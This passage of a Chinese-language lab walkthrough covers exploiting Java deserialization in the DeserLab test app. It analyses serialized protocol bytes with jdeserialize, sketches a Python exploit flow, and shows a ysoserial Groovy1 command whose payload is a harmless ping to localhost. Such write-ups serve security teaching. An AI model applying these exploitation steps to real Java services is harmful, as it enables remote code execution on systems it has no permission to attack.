    STREAM_MAGIC - 0xac ed
    STREAM_VERSION - 0x00 05
    Contents
    TC_BLOCKDATA - 0x77
    Length - 4 - 0x04
    Contents - 0xf000baaa
    TC_BLOCKDATA - 0x77
    Length - 2 - 0x02
    Contents - 0x0101
    TC_OBJECT - 0x73
    TC_CLASSDESC - 0x72
    className
    Length - 20 - 0x00 14
    Value - nb.deser.HashRequest - 0x6e622e64657365722e4861736852657175657374
我们需要编译才能使用jdeserialize工具。编译任务可以使用[ant](http://ant.apache.org/)以及build.xml文件来完成，我选择手动编译方式，具体命令如下：
    mkdir build
    javac -d ./build/ src/*
    cd build
    jar cvf jdeserialize.jar *
上述命令可以生成jar文件，你可以使用如下命令输出帮助信息以测试jar文件是否已正确生成：
    java -cp jdeserialize.jar org.unsynchronized.jdeserialize
jdeserialize工具需要一个输入文件，因此我们可以使用python之类的工具将十六进制的序列化数据保存成文件，如下所示（我缩减了十六进制字符串以便阅读）：
    open('rawser.bin','wb').write('aced00057704f000baaa77020146636'.decode('hex'))
接下来，我们使用待处理文件名作为第一个参数，传递给jdeserialize工具，处理结果如下所示：
    java -cp jdeserialize.jar org.unsynchronized.jdeserialize rawser.bin
    read: [blockdata 0x00: 4 bytes]
    read: [blockdata 0x00: 2 bytes]
    read: nb.deser.HashRequest _h0x7e0002 = r_0x7e0000;
    //// BEGIN stream content output
    [blockdata 0x00: 4 bytes]
    [blockdata 0x00: 2 bytes]
    nb.deser.HashRequest _h0x7e0002 = r_0x7e0000;
    //// END stream content output
    //// BEGIN class declarations (excluding array classes)
    class nb.deser.HashRequest implements java.io.Serializable {
    java.lang.String dataToHash;
    java.lang.String theHash;
    }
    //// END class declarations
    //// BEGIN instance dump
    [instance 0x7e0002: 0x7e0000/nb.deser.HashRequest
    field data:
    0x7e0000/nb.deser.HashRequest:
    dataToHash: r0x7e0003: [String 0x7e0003: "test"]
    theHash: r0x7e0004: [String 0x7e0004: "098f6bcd4621d373cade4e832627b4f6"]
    ]
    //// END instance dump
从这两个分析工具的输出中，我们首先可以确认的是，这段数据的确是序列化数据。其次，我们可以确认的是，客户端和服务器之间正在传输一个“nb.deser.HashRequest”对象。结合工具的输出结果以及前面的wireshark抓包数据，我们可知用户名以字符串形式存储在TC_BLOCKDATA类型中进行传输：
    TC_BLOCKDATA - 0x77
    Length - 9 - 0x09
    Contents - 0x000774657374696e67
    '000774657374696e67'.decode('hex')
    'x00x07testing'
现在我们对DeserLab客户端与服务器之间的通信过程已经非常熟悉，接下来我们可以使用ysoserial工具来利用这个过程。
**2.3 利用DeserLab中的漏洞**
根据pcap的分析结果以及序列化数据的分析结果，我们已经非常熟悉整个环境的通信过程，因此我们可以构建自己的python脚本，脚本中可以嵌入ysoserial载荷。为了保持代码的简洁，也为了匹配wireshark数据流，我决定使用类似wireshark数据流的方式来实现这段代码，如下所示：
    mydeser = deser(myargs.targetip, myargs.targetport)
    mydeser.connect()
    mydeser.javaserial()
    mydeser.protohello()
    mydeser.protoversion()
    mydeser.clientname()
    mydeser.exploit(myargs.payloadfile)
你可以在[这里](https://gist.github.com/DiabloHorn/8630948d953386d2ed575e17f8635ee7)找到完整版的代码。
如你所见，最简单的方法是将所有java反序列化交换数据硬编码到代码中。你可能对代码的具体写法有些疑问，比如为什么`mydeser.exploit(myargs.payloadfile)`位于`mydeser.clientname()`之后，以及我根据什么来决定代码的具体位置。因此我想解释一下我的思考过程，也顺便介绍一下如何生成并发送ysoserial载荷。
在读完有关Java反序列化的几篇文章之后（见本文的参考资料），我总结了两点思想：
1、大多数漏洞都与Java对象的反序列化有关。
2、大多数漏洞都与Java对象的反序列化有关。
开个玩笑而已。所以如果我们检查服务器与客户端的信息交互过程，我们可以在某个地方找到Java对象的交换过程。我们很容易就能在序列化数据的分析结果中找到这个目标，因为它要么包含“TC_OBJECT
– 0x73”特征，要么包含如下数据：
    //// BEGIN stream content output
    [blockdata 0x00: 4 bytes]
    [blockdata 0x00: 2 bytes]
    [blockdata 0x00: 9 bytes]
    nb.deser.HashRequest _h0x7e0002 = r_0x7e0000; 
    //// END stream content output
从以上输出中，我们可以看到流数据的最后一部分内容为“nb.deser.HashRequest”对象。读取这个对象的位置正是交换过程的最后一部分，这也解释了为什么漏洞利用函数位于代码的末尾。现在我们已经知道漏洞利用载荷的存放位置，我们怎么样才能生成并发送载荷呢？
DeserLab本身的代码其实没有包含任何可利用的东西，具体原因下文会解释，现在我们只需要接受这个事实即可。这意味着我们需要查找其他程序库，从中挖掘能帮助我们的代码。DeserLab仅仅包含一个Groovy库，这足以给我们足够多的提示来生成ysoserial载荷。在现实世界中，我们往往需要亲自反汇编未知程序库，才能寻找到有用的代码，这些代码也可以称为漏洞利用的小工具（gadget）。
掌握库信息后，载荷的生成就会变得非常简单，命令如下所示：
    java -jar ysoserial-master-v0.0.4-g35bce8f-67.jar Groovy1 'ping 127.0.0.1' > payload.bin
需要注意的是，载荷发送后不会返回任何响应，因此如果我们想确认载荷是否工作正常，我们需要一些方法来检测。在实验环境中，一个ping
localhost命令足以，但在实际环境中，我们需要找到更好的方式。
现在万事俱备，是不是只需要发送载荷就可以大功告成？差不多是这个样子，但我们不要忘了Java序列化头部交换过程在这之前已经完成，这意味着我们需要剔除载荷头部的前4个字节，然后再发送载荷：